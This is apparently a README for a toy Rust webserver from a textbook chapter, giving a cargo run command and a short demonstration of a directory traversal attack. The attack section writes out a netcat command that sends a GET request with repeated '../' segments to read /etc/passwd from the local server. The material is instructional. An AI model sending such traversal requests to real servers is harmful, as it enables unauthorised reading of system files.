## webserver

Chapter.4

## How to run

```
cargo run 127.0.0.1 8080
```

Access http://localhost:8080/index.html

## Attack by directory traversal

It's dangerous command

```
echo -en "GET /../../../../../../../../etc/passwd HTTP/1.1\r\n" | nc localhost 8080
```
